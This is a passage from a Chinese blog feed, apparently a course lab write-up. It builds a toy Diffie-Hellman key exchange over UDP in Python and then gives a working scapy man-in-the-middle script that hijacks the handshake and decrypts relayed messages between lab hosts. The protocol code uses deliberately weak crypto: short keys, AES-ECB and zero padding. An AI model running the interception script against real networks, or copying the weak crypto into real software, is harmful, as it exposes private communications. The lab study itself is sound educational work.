magic(&#x27;DH&#x27;)     |   ver    |   type   |</span><br><span class="line">+-------------------------------+----------+</span><br><span class="line">|                  len-p                   |</span><br><span class="line">+--------------------+---------------------+</span><br><span class="line">|                   p                      |</span><br><span class="line">|                                          |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">|                   g                      |</span><br><span class="line">|                                          |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">|                   A                      |</span><br><span class="line">|                                          |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">其中p、g、A为可变长度，长度为len-p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             DH handshake reply</span><br><span class="line">+--------------------+----------+----------+</span><br><span class="line">|    magic(DH)       |   ver    |   type   |</span><br><span class="line">+-------------------------------+----------+</span><br><span class="line">|                  len-B                   |</span><br><span class="line">+--------------------+---------------------+</span><br><span class="line">|                   B                      |</span><br><span class="line">|                                          |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">其中B为可变长度，长度为len-B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">              DH send data</span><br><span class="line">+--------------------+----------+----------+</span><br><span class="line">|    magic(DH)       |   ver    |   type   |</span><br><span class="line">+-------------------------------+----------+</span><br><span class="line">|                   data                   |</span><br><span class="line">|                                          |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">其中data为可变长度</span><br><span class="line"></span><br><span class="line">type字段：</span><br><span class="line">&#x27;\x01&#x27;: HANDSHAKE_REQUEST</span><br><span class="line">&#x27;\x02&#x27;: HANDSHAKE_REPLY</span><br><span class="line">&#x27;\x03&#x27;: SEND_DATA</span><br></pre></td></tr></table></figure><h3 id="3-2-client-与-server-代码"><a href="#3-2-client-与-server-代码" class="headerlink" title="3.2 client 与 server 代码"></a>3.2 client 与 server 代码</h3><p>关于数学方面的代码完全从 yydslz 那里copy过来的</p><details green><summary> DH_key.py </summary>              <div class='content'>              <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = 16</span><br><span class="line"></span><br><span class="line">def power(x, y, p):</span><br><span class="line">    res = 1</span><br><span class="line"></span><br><span class="line">    x = x % p</span><br><span class="line">    while (y &gt; 0):</span><br><span class="line"></span><br><span class="line">        if (y &amp; 1):</span><br><span class="line">            res = (res * x) % p</span><br><span class="line"></span><br><span class="line">        y = y&gt;&gt;1</span><br><span class="line">        x = (x * x) % p</span><br><span class="line"></span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def miillerTest(d, n):</span><br><span class="line"></span><br><span class="line">    a = 2 + random.randint(1, n - 4)</span><br><span class="line"></span><br><span class="line">    x = power(a, d, n)</span><br><span class="line"></span><br><span class="line">    if (x == 1 or x == n - 1):</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    while (d != n - 1):</span><br><span class="line">        x = (x * x) % n</span><br><span class="line">        d *= 2</span><br><span class="line"></span><br><span class="line">        if (x == 1):</span><br><span class="line">            return False</span><br><span class="line">        if (x == n - 1):</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def isPrime(n, k):</span><br><span class="line">    if (n &lt;= 1 or n == 4):</span><br><span class="line">        return False</span><br><span class="line">    if (n &lt;= 3):</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    d = n - 1</span><br><span class="line">    while (d % 2 == 0):</span><br><span class="line">        d //= 2</span><br><span class="line">        </span><br><span class="line">    for i in range(k):</span><br><span class="line">        if (miillerTest(d, n) == False):</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def EX_GCD(a, b, arr):</span><br><span class="line">    if b == 0:</span><br><span class="line">        arr[0] = 1</span><br><span class="line">        arr[1] = 0</span><br><span class="line">        return a</span><br><span class="line">    g = EX_GCD(b, a % b, arr)</span><br><span class="line">    t = arr[0]</span><br><span class="line">    arr[0] = arr[1]</span><br><span class="line">    arr[1] = t - int(a // b) * arr[1]</span><br><span class="line">    return g</span><br><span class="line"></span><br><span class="line">def inverse_mod(a, n):</span><br><span class="line">    arr = [0,1,]</span><br><span class="line">    gcd = EX_GCD(a,n,arr)</span><br><span class="line">    if gcd == 1:</span><br><span class="line">        return (arr[0] % n + n) % n</span><br><span class="line">    else:</span><br><span class="line">        return -1</span><br><span class="line"></span><br><span class="line">def genNbitsPrime(n):</span><br><span class="line">    index = n</span><br><span class="line">    num = 0</span><br><span class="line">    for i in range(index):</span><br><span class="line">        num = num * 2 + random.randint(0, 1)</span><br><span class="line">    while num%2 == 0 or isPrime(num, 10) == False:</span><br><span class="line">        num = num + 1</span><br><span class="line">    return num</span><br><span class="line"></span><br><span class="line">def Primitiveroot(p):</span><br><span class="line">    k=(p-1) // 2</span><br><span class="line">    for i in range(2, p-1):</span><br><span class="line">        if pow(i, k, p)!=1:</span><br><span class="line">            return i</span><br></pre></td></tr></table></figure>              </div>            </details><details green><summary> DH.py (协议相关代码) </summary>              <div class='content'>              <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">from enum import Enum</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">import DH_key</span><br><span class="line"></span><br><span class="line">MAGIC = b&#x27;DH&#x27;</span><br><span class="line">VERSION = b&#x27;\x01&#x27;</span><br><span class="line">DEFAULT_BUFFER_SIZE = 1024</span><br><span class="line">DEFAULT_KEY_BIT_LENGTH = 8*16</span><br><span class="line"></span><br><span class="line">class DHType(Enum):</span><br><span class="line">    HANDSHAKE_REQUEST = b&#x27;\x01&#x27;</span><br><span class="line">    HANDSHAKE_REPLY = b&#x27;\x02&#x27;</span><br><span class="line">    SEND_DATA = b&#x27;\x03&#x27;</span><br><span class="line"></span><br><span class="line">class DHProto:</span><br><span class="line">    def AES_encrypt(self, message, key):</span><br><span class="line">        key = long_to_bytes(key)</span><br><span class="line">        obj = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        message = message.ljust(16, b&#x27;\x00&#x27;)</span><br><span class="line">        ciphertext = obj.encrypt(message)</span><br><span class="line">        return ciphertext</span><br><span class="line"></span><br><span class="line">    def AES_decrypt(self, ciper, key):</span><br><span class="line">        key = long_to_bytes(key)</span><br><span class="line">        obj = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        message = obj.decrypt(ciper)</span><br><span class="line">        return message.rstrip(b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">    def pack_data(self, message, key):</span><br><span class="line">        DH_type = DHType.SEND_DATA.value</span><br><span class="line">        header = struct.pack(&#x27;&gt;2sss&#x27;, MAGIC, VERSION, DH_type)</span><br><span class="line">        data = self.AES_encrypt(message, key)</span><br><span class="line">        return header + data</span><br><span class="line">    def unpack_data(self, data, key):</span><br><span class="line">        magic, ver, DH_type = struct.unpack(&#x27;&gt;2sss&#x27;, data[:4])</span><br><span class="line">        if magic != MAGIC or ver != VERSION or DH_type != DHType.SEND_DATA.value:</span><br><span class="line">            return b&#x27;&#x27;</span><br><span class="line">        message = self.AES_decrypt(data[4:], key)</span><br><span class="line">        return message</span><br><span class="line"></span><br><span class="line">    def is_send_data(self, pkt_data):</span><br><span class="line">        if len(pkt_data) &gt; 4 and pkt_data[:2] == MAGIC and pkt_data[2:3] == VERSION and pkt_data[3:4] == DHType.SEND_DATA.value:</span><br><span class="line">            return True</span><br><span class="line">        return False</span><br><span class="line">    </span><br><span class="line">    def is_handshake_request(self, pkt_data):</span><br><span class="line">        if len(pkt_data) &gt; 4 and pkt_data[:2] == MAGIC and pkt_data[2:3] == VERSION and pkt_data[3:4] == DHType.HANDSHAKE_REQUEST.value:</span><br><span class="line">            return True</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    def is_handshake_reply(self, pkt_data):</span><br><span class="line">        if len(pkt_data) &gt; 4 and pkt_data[:2] == MAGIC and pkt_data[2:3] == VERSION and pkt_data[3:4] == DHType.HANDSHAKE_REPLY.value:</span><br><span class="line">            return True</span><br><span class="line">        return False</span><br><span class="line">    </span><br><span class="line">    def has_key(self):</span><br><span class="line">        return hasattr(self, &quot;key&quot;)</span><br><span class="line"></span><br><span class="line">class DHClient(DHProto):</span><br><span class="line">    def __init__(self, target_ip_addr=None, target_port=None, buffer_size=DEFAULT_BUFFER_SIZE):</span><br><span class="line">        self.ip_addr = target_ip_addr</span><br><span class="line">        self.port = target_port</span><br><span class="line">        self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        self._buffer_size = buffer_size</span><br><span class="line"></span><br><span class="line">    def set_target(self, target_ip_addr, target_port):</span><br><span class="line">        self.ip_addr = target_ip_addr</span><br><span class="line">        self.port = target_port</span><br><span class="line"></span><br><span class="line">    def _gen_handshake_request(self, key_bit_len=DEFAULT_KEY_BIT_LENGTH):</span><br><span class="line">        DH_type = DHType.HANDSHAKE_REQUEST.value</span><br><span class="line">        self._p = DH_key.genNbitsPrime(key_bit_len)</span><br><span class="line">        self._g = DH_key.Primitiveroot(self._p)</span><br><span class="line">        self._privite_key = DH_key.genNbitsPrime(key_bit_len)</span><br><span class="line">        self._A = pow(self._g, self._privite_key, self._p)</span><br><span class="line">        key_len = (key_bit_len + 7) // 8</span><br><span class="line">        p = self._p.to_bytes(key_len, byteorder=&#x27;big&#x27;)</span><br><span class="line">        g = self._g.to_bytes(key_len, byteorder=&#x27;big&#x27;)</span><br><span class="line">        A = self._A.to_bytes(key_len, byteorder=&#x27;big&#x27;)</span><br><span class="line">        header = struct.pack(&#x27;&gt;2sssI&#x27;, MAGIC, VERSION, DH_type, key_len)</span><br><span class="line">        return header + p + g + A</span><br><span class="line"></span><br><span class="line">    def _handle_handshake_reply(self, pkt_data):</span><br><span class="line">        magic, ver, DH_type, key_len = struct.unpack(&#x27;&gt;2sssI&#x27;, pkt_data[:8])</span><br><span class="line">        if magic != MAGIC or ver != VERSION or DH_type != DHType.HANDSHAKE_REPLY.value:</span><br><span class="line">            return</span><br><span class="line">        B = int.from_bytes(pkt_data[8:], byteorder=&#x27;big&#x27;)</span><br><span class="line">        self.key = pow(B, self._privite_key, self._p)</span><br><span class="line">        print(&quot;Client key: &quot; + str(self.key))</span><br><span class="line"></span><br><span class="line">    def hand_shake(self):</span><br><span class="line">        data = self._gen_handshake_request()</span><br><span class="line">        self._socket.sendto(data, (self.ip_addr, self.port))</span><br><span class="line">        data, addr = self._socket.recvfrom(self._buffer_size)</span><br><span class="line">        self._handle_handshake_reply(data)</span><br><span class="line"></span><br><span class="line">    def send(self, message):</span><br><span class="line">        pkt_data = self.pack_data(message.encode(&#x27;utf8&#x27;), self.key)</span><br><span class="line">        self._socket.sendto(pkt_data, (self.ip_addr, self.port))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def recv(self):</span><br><span class="line">        pkt_data, addr = self._socket.recvfrom(self._buffer_size)</span><br><span class="line">        if not self.is_send_data(pkt_data):</span><br><span class="line">            return &#x27;&#x27;</span><br><span class="line">        message = self.unpack_data(pkt_data, self.key).decode(&#x27;utf8&#x27;)</span><br><span class="line">        return message</span><br><span class="line"></span><br><span class="line">class DHServer(DHProto):</span><br><span class="line">    def __init__(self, ip_addr=&quot;127.0.0.1&quot;, port=8000, buffer_size=DEFAULT_BUFFER_SIZE):</span><br><span class="line">        self.ip_addr = ip_addr</span><br><span class="line">        self.port = port</span><br><span class="line">        self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        self._socket.bind((ip_addr, port))</span><br><span class="line">        self._buffer_size = buffer_size</span><br><span class="line"></span><br><span class="line">    def _handle_handshake_request(self, pkt_data):</span><br><span class="line">        magic, ver, DH_type, key_len = struct.unpack(&#x27;&gt;2sssI&#x27;, pkt_data[:8])</span><br><span class="line">        if magic != MAGIC or ver != VERSION or DH_type != DHType.HANDSHAKE_REQUEST.value:</span><br><span class="line">            return</span><br><span class="line">        p, g, A = [int.from_bytes(pkt_data[8 + key_len * i: 8 + key_len * (i + 1)], byteorder=&#x27;big&#x27;) for i in range(3)]</span><br><span class="line">        self._p = p</span><br><span class="line">        self._g = g</span><br><span class="line">        self._A = A</span><br><span class="line">        self._privite_key = DH_key.genNbitsPrime(key_len)</span><br><span class="line">        self.key = pow(A, self._privite_key, p)</span><br><span class="line">        self._B = pow(g, self._privite_key, p)</span><br><span class="line">        print(&quot;Server key: &quot; + str(self.key))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def _gen_handshake_reply(self):</span><br><span class="line">        DH_type = DHType.HANDSHAKE_REPLY.value</span><br><span class="line">        if not hasattr(self, &quot;_B&quot;):</span><br><span class="line">            return b&#x27;&#x27;</span><br><span class="line">        key_bit_len = self._B.bit_length()</span><br><span class="line">        key_len = (key_bit_len + 7) // 8</span><br><span class="line">        B = self._B.to_bytes(key_len, byteorder=&#x27;big&#x27;)</span><br><span class="line">        header = struct.pack(&#x27;&gt;2sssI&#x27;, MAGIC, VERSION, DH_type, key_len)</span><br><span class="line">        return header + B</span><br><span class="line"></span><br><span class="line">    def hand_shake(self, data, addr):</span><br><span class="line">        if not self.is_handshake_request(data):</span><br><span class="line">            return False</span><br><span class="line">        self._handle_handshake_request(data)</span><br><span class="line">        data = self._gen_handshake_reply()</span><br><span class="line">        self._socket.sendto(data, addr)</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    def send(self, message, addr):</span><br><span class="line">        pkt_data = self.pack_data(message.encode(&#x27;utf8&#x27;), self.key)</span><br><span class="line">        self._socket.sendto(pkt_data, addr)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def recv(self):</span><br><span class="line">        pkt_data, addr = self._socket.recvfrom(self._buffer_size)</span><br><span class="line">        if not self.is_send_data(pkt_data):</span><br><span class="line">            return &#x27;&#x27;</span><br><span class="line">        message = self.unpack_data(pkt_data, self.key).decode(&#x27;utf8&#x27;)</span><br><span class="line">        return message, addr</span><br><span class="line"></span><br><span class="line">    def recv_data(self, message):</span><br><span class="line">        pkt_data, addr = self._socket.recvfrom(self._buffer_size)</span><br><span class="line">        print(pkt_data, addr)</span><br><span class="line">        recv_message = self.unpack_data(pkt_data, self.key).decode(&#x27;utf8&#x27;)</span><br><span class="line">        print(recv_message, addr)</span><br><span class="line">        pkt_data = self.pack_data(message.encode(&#x27;utf8&#x27;), self.key)</span><br><span class="line">        self._socket.sendto(pkt_data, addr)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        data, addr = self._socket.recvfrom(self._buffer_size)</span><br><span class="line">        if self.hand_shake(data, addr):</span><br><span class="line">            while True:</span><br><span class="line">                m, addr2 = self.recv()</span><br><span class="line">                print(m)</span><br><span class="line">                if m == &#x27;&#x27; or addr2 != addr:</span><br><span class="line">                    break</span><br><span class="line">                self.send(&#x27;U201911711&#x27;, addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><details green><summary> server.py </summary>              <div class='content'>              <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from DH import DHServer</span><br><span class="line"></span><br><span class="line">server = DHServer()</span><br><span class="line">server.run()</span><br></pre></td></tr></table></figure>              </div>            </details><details green><summary> client.py </summary>              <div class='content'>              <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from DH import DHClient</span><br><span class="line"></span><br><span class="line">client = DHClient(&quot;127.0.0.1&quot;, 8000)</span><br><span class="line">client.hand_shake()</span><br><span class="line">client.send(&#x27;test&#x27;)</span><br><span class="line">m = client.recv()</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>              </div>            </details><h3 id="3-3-中间人攻击"><a href="#3-3-中间人攻击" class="headerlink" title="3.3 中间人攻击"></a>3.3 中间人攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">from DH import DHServer, DHClient</span><br><span class="line"></span><br><span class="line"># Machine A&#x27;s informaton</span><br><span class="line">IP_A  = &quot;192.168.25.130&quot;</span><br><span class="line">MAC_A = &quot;00:0c:29:29:08:c5&quot;</span><br><span class="line"></span><br><span class="line"># Machine B&#x27;s informaton</span><br><span class="line"># treat Gateway as Machine B</span><br><span class="line">IP_B  = &quot;192.168.25.51&quot;</span><br><span class="line">MAC_B = &quot;00:0c:29:61:8e:be&quot;</span><br><span class="line"></span><br><span class="line"># Server2&#x27;s information</span><br><span class="line">IP_Server2 = &quot;192.168.25.51&quot;</span><br><span class="line">MAC_Server2 = &quot;00:0c:29:61:8e:be&quot;</span><br><span class="line"></span><br><span class="line"># Attacker Machine&#x27;s informaton</span><br><span class="line">IP_M  = &quot;192.168.25.128&quot;</span><br><span class="line">MAC_M = &quot;00:0c:29:47:b2:ee&quot;</span><br><span class="line"></span><br><span class="line">def spoof_pkt(pkt):</span><br><span class="line">    global lserver</span><br><span class="line">    global lclient</span><br><span class="line">    if pkt.haslayer(IP):</span><br><span class="line">        if pkt[IP].src == IP_A and pkt[IP].dst == IP_Server2 and hasattr(pkt[UDP], &quot;payload&quot;):</span><br><span class="line">            newpkt = pkt</span><br><span class="line">            del newpkt[IP].chksum</span><br><span class="line">            del newpkt[UDP].chksum</span><br><span class="line">            data = newpkt[UDP].payload.load</span><br><span class="line">            if lserver.is_handshake_request(data):</span><br><span class="line">                newpkt2 = newpkt</span><br><span class="line">                newpkt2.src = MAC_M</span><br><span class="line">                newpkt2.dst = MAC_Server2</span><br><span class="line">                del newpkt2[UDP].payload</span><br><span class="line">                data_to_server = lclient._gen_handshake_request()</span><br><span class="line">                newpkt2 = newpkt2 / data_to_server</span><br><span class="line">                sendp(newpkt2)</span><br><span class="line">                print(&quot;send handshake request to server&quot;)</span><br><span class="line"></span><br><span class="line">                lserver._handle_handshake_request(data)</span><br><span class="line">                data_to_A = lserver._gen_handshake_reply()</span><br><span class="line">                newpkt.src = MAC_M</span><br><span class="line">                newpkt.dst = MAC_A</span><br><span class="line">                newpkt[IP].src = IP_Server2</span><br><span class="line">                newpkt[IP].dst = IP_A</span><br><span class="line">                newpkt[UDP].sport, newpkt[UDP].dport = newpkt[UDP].dport, newpkt[UDP].sport</span><br><span class="line">                del newpkt[UDP].payload</span><br><span class="line">                del newpkt[IP].len</span><br><span class="line">                del newpkt[UDP].len</span><br><span class="line">                newpkt = newpkt / data_to_A</span><br><span class="line">                sendp(newpkt)</span><br><span class="line">                print(&quot;receive handshake request from A and reply&quot;)</span><br><span class="line"></span><br><span class="line">            elif lserver.is_send_data(data) and lserver.has_key():</span><br><span class="line">                msg = lserver.unpack_data(data, lserver.key)</span><br><span class="line">                print(&quot;mag: &quot;, msg)</span><br><span class="line">                for i in range(10):</span><br><span class="line">                    if lclient.has_key():</span><br><span class="line">                        break</span><br><span class="line">                    sleep(0.1)</span><br><span class="line">                if not lclient.has_key():</span><br><span class="line">                    print(&quot;local client doesn&#x27;t have secret key?&quot;)</span><br><span class="line">                    return</span><br><span class="line">                pkt_data = lclient.pack_data(msg, lclient.key)</span><br><span class="line">                newpkt.src = MAC_M</span><br><span class="line">                newpkt.dst = MAC_Server2</span><br><span class="line">                del newpkt[UDP].payload</span><br><span class="line">                newpkt = newpkt / pkt_data</span><br><span class="line">                sendp(newpkt)</span><br><span class="line">                print(&quot;send data to server&quot;)</span><br><span class="line"></span><br><span class="line">        elif pkt[IP].src == IP_Server2 and pkt[IP].dst == IP_A and hasattr(pkt[UDP], &quot;payload&quot;):</span><br><span class="line">            newpkt = pkt</span><br><span class="line">            del newpkt[IP].chksum</span><br><span class="line">            del newpkt[UDP].chksum</span><br><span class="line">            data = newpkt[UDP].payload.load</span><br><span class="line">            if lclient.is_handshake_reply(data):</span><br><span class="line">                lclient._handle_handshake_reply(data)</span><br><span class="line">                print(&quot;local client gets secret key&quot;)</span><br><span class="line">            elif lclient.is_send_data(data):</span><br><span class="line">                newpkt.src = MAC_M</span><br><span class="line">                newpkt.dst = MAC_A</span><br><span class="line">                msg = lclient.unpack_data(data, lclient.key)</span><br><span class="line">                print(&quot;mag: &quot;, msg)</span><br><span class="line">                pkt_data = lserver.pack_data(msg, lserver.key)</span><br><span class="line">                del newpkt[UDP].payload</span><br><span class="line">                newpkt = newpkt / pkt_data</span><br><span class="line">                sendp(newpkt)</span><br><span class="line">                print(&quot;reply data&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    lserver = DHServer()</span><br><span class="line">    lclient = DHClient()</span><br><span class="line">    f = &#x27;udp and (ether src &#123;&#125; or ether src &#123;&#125; )&#x27;.format(MAC_A, MAC_B)</span><br><span class="line">    pkt = sniff(filter=f, prn=spoof_pkt)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 嗅探 </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP stream wrapper</title>
      <link href="2021/01/26/PHP_stream_wrapper/"/>
      <url>2021/01/26/PHP_stream_wrapper/</url>
      
